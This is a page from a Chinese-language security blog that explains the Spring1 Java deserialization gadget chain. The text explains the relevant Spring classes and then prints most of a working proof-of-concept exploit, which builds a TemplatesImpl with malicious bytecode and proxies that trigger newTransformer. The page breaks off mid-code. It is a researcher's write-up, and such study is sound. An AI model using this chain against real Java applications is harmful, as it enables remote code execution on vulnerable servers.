@@ -1,0 +1,1087 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Ko1sh1">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2022/03/05/blog_java spring反序列化链/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Spring 依赖反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Spring 反序列化">
+<meta property="og:url" content="http://example.com/2022/03/05/blog_java%20spring%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Spring 依赖反序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/blog/UU%25%7D%7D5AHI599(@(%25ZV)0HJ.png">
+<meta property="og:image" content="http://example.com/images/blog/1627522830580.png">
+<meta property="og:image" content="http://example.com/images/blog/1627522834769.png">
+<meta property="og:image" content="http://example.com/images/blog/1627522838105.png">
+<meta property="article:published_time" content="2022-03-05T07:44:17.000Z">
+<meta property="article:modified_time" content="2024-05-30T13:31:43.665Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java 反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/blog/UU%25%7D%7D5AHI599(@(%25ZV)0HJ.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+    <meta name="theme-color" content="#FFA07A">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Spring 反序列化 -
+        
+        Ko1sh1&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/text.js'></script>
+                
+    
+            
+                
+                    <link rel='stylesheet' href='/css/mouse.css'>
+                
+    
+
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ko1sh1&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links/">
+                                                    师傅们
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links/">师傅们</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/masonry"
+                        >
+                            <span>Photos</span>
+                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/images/blog6.jpg" alt="Spring 反序列化" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Spring 反序列化</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2022-03-05 15:44:17</span>
+        <span class="mobile">2022-03-05 15:44:17</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-30 21:31:43</span>
+            <span class="mobile">2024-05-30 21:31:43</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/java/">java</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java 反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.8k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>8 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Spring1反序列化"><a href="#Spring1反序列化" class="headerlink" title="Spring1反序列化"></a>Spring1反序列化</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.4.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="MethodInvokeTypeProvider"><a href="#MethodInvokeTypeProvider" class="headerlink" title="MethodInvokeTypeProvider"></a>MethodInvokeTypeProvider</h4><p>在 Spring 核心包中存在这样一个内部类：<code>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider</code>，这个类实现了 TypeProvider 接口，是一个可以被反序列化的类。</p>
+<p>readObject代码如下，调用了ReflectionUtils.findMethod获取Method对象，调用invokeMethod执行方法。无参调用，如果可以调用到TemplatesImpl.newTransformer即可完成反序列化链了。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    inputStream.defaultReadObject();</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">    <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>假如我们的 this.provider.getType() 和 methodName 可控，这里就可以将 getType 写成是templateImpl的类，methodName要是能处理为 newTransformer 的话，这里就可以执行任意代码了。</p>
+<h4 id="ObjectFactoryDelegatingInvocationHandler"><a href="#ObjectFactoryDelegatingInvocationHandler" class="headerlink" title="ObjectFactoryDelegatingInvocationHandler"></a>ObjectFactoryDelegatingInvocationHandler</h4><p><code>org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code> 是 InvocationHandler 的实现类，实例化时接收一个 ObjectFactory 对象，并在 invoke 代理时调用 ObjectFactory 的 getObject 方法返回 ObjectFactory 的实例用于 Method 的反射调用。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/UU%25%7D%7D5AHI599(@(%25ZV)0HJ.png"
+                      alt="img"
+                ></p>
+<p>当我触发代理的方法不为 equals、hashCode、toString时，就能对getObject返回的对象触发代理方法。</p>
+<p>ObjectFactory 的 getObject 方法返回的对象是泛型的，那就可以可用 AnnotationInvocationHandler 来代理，返回任意对象。</p>
+<p>而 ObjectFactoryDelegatingInvocationHandler 自己本身就是代理类，可以用它代理之前的 TypeProvider 的 getType 方法。</p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.ObjectFactory;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spring1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;Spring1.bin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> Reflections.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 动态代理</span></span><br><span class="line">        Class&lt;?&gt;       c           = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;getObject&quot;</span>, tmpl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用动态代理初始化 AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);</span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 ObjectFactory 的 getObject 方法，使其返回 TemplatesImpl</span></span><br><span class="line">        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(</span><br><span class="line">                ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ObjectFactoryDelegatingInvocationHandler 的 invoke 方法触发 ObjectFactory 的 getObject</span></span><br><span class="line">        <span class="comment">// 并且会调用 method.invoke(返回值,args)</span></span><br><span class="line">        <span class="comment">// 此时返回值被我们使用动态代理改为了 TemplatesImpl</span></span><br><span class="line">        <span class="comment">// 接下来需要 method 是 newTransformer()，就可以触发调用链了</span></span><br><span class="line">        Class&lt;?&gt;       clazz          = Class.forName(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ofdConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 使用动态代理出的 ObjectFactory 类实例化 ObjectFactoryDelegatingInvocationHandler</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">ofdHandler</span> <span class="operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ObjectFactoryDelegatingInvocationHandler 本身就是个 InvocationHandler</span></span><br><span class="line">        <span class="comment">// 使用它来代理一个类，这样在这个类调用时将会触发 ObjectFactoryDelegatingInvocationHandler 的 invoke 方法</span></span><br><span class="line">        <span class="comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span></span><br><span class="line">        <span class="comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">typeTemplateProxy</span> <span class="operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span></span><br><span class="line">        HashMap&lt;String, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(<span class="string">&quot;getType&quot;</span>, typeTemplateProxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">newInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);</span><br><span class="line">        <span class="comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化 MethodInvokeTypeProvider</span></span><br><span class="line">        Class&lt;?&gt;       clazz2 = Class.forName(<span 